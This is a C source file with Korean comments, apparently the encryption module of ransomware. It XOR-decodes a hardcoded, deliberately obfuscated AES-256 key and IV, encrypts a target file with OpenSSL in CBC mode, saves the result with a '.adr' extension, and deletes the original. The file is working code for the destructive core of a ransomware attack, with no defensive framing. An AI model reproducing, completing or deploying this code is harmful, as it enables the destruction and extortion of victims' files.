#include "encryptor.h"
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <windows.h>
#include <openssl/evp.h>

#define FILENAME_PADDING 256

// XOR 마스크
static const unsigned char xor_mask = 0xA5;

// 난독화된 AES-256 키 (총 32바이트)
static const unsigned char obfuscated_key[32] = {
    0x14, 0x5d, 0x52, 0x3b, 0xd8, 0xa7, 0xa4, 0xeb,
    0x9d, 0x00, 0x6c, 0x42, 0x26, 0x8d, 0xd3, 0x18,
    0x5f, 0x12, 0x22, 0xad, 0xb8, 0xc2, 0x1a, 0x5f,
    0xac, 0x71, 0x96, 0x9e, 0xce, 0xc7, 0x6b, 0xd9
};

// 난독화된 IV (16바이트)
static const unsigned char obfuscated_iv[16] = {
    0x99, 0xdb, 0xbc, 0xef, 0xa5, 0x77, 0xf0, 0x16,
    0x33, 0x84, 0x5b, 0xcb, 0x01, 0xac, 0x75, 0x69
};

// 키 복원
void restore_key(unsigned char* key_out) {
    for (int i = 0; i < AES_KEY_SIZE; i++) {
        key_out[i] = obfuscated_key[i] ^ xor_mask;
    }
}

// IV 복원
void restore_iv(unsigned char* iv_out) {
    for (int i = 0; i < AES_BLOCK_SIZE; i++) {
        iv_out[i] = obfuscated_iv[i] ^ xor_mask;
    }
}

// 파일 암호화
void encrypt_file(const char* filepath, const unsigned char* key, const unsigned char* iv) {
    printf("[DEBUG] encrypt_file() 호출: %s\n", filepath); // 디버깅용

    FILE* in = fopen(filepath, "rb");
    if (!in) {
        printf("[!] 파일 열기 실패: %s\n", filepath);
        return;
    }

    fseek(in, 0, SEEK_END);
    long fsize = ftell(in);
    rewind(in);

    unsigned char* buffer = malloc(fsize + FILENAME_PADDING);
    if (!buffer) {
        fclose(in);
        printf("[!] 메모리 할당 실패 (buffer)\n");
        return;
    }

    fread(buffer, 1, fsize, in);
    fclose(in);

    memset(buffer + fsize, 0, FILENAME_PADDING);
    const char* fname = strrchr(filepath, '\\') ? strrchr(filepath, '\\') + 1 : filepath;
    strncpy((char*)(buffer + fsize), fname, FILENAME_PADDING - 1);

    int outlen1 = 0, outlen2 = 0;
    int total_len = (int)(fsize + FILENAME_PADDING + EVP_MAX_BLOCK_LENGTH);
    unsigned char* outbuf = malloc(total_len);
    if (!outbuf) {
        free(buffer);
        printf("[!] 메모리 할당 실패 (outbuf)\n");
        return;
    }

    EVP_CIPHER_CTX* ctx = EVP_CIPHER_CTX_new();
    EVP_EncryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv);
    EVP_EncryptUpdate(ctx, outbuf, &outlen1, buffer, (int)(fsize + FILENAME_PADDING));
    EVP_EncryptFinal_ex(ctx, outbuf + outlen1, &outlen2);
    EVP_CIPHER_CTX_free(ctx);

    char newname[MAX_PATH];
    snprintf(newname, MAX_PATH, "%s.adr", filepath);
    FILE* out = fopen(newname, "wb");
    if (!out) {
        printf("[!] 암호화 결과 저장 실패: %s\n", newname);
        free(buffer);
        free(outbuf);
        return;
    }

    fwrite(outbuf, 1, outlen1 + outlen2, out);
    fclose(out);

    free(buffer);
    free(outbuf);
    DeleteFileA(filepath);

    printf("[+] 암호화 완료: %s → %s\n", filepath, newname);
}
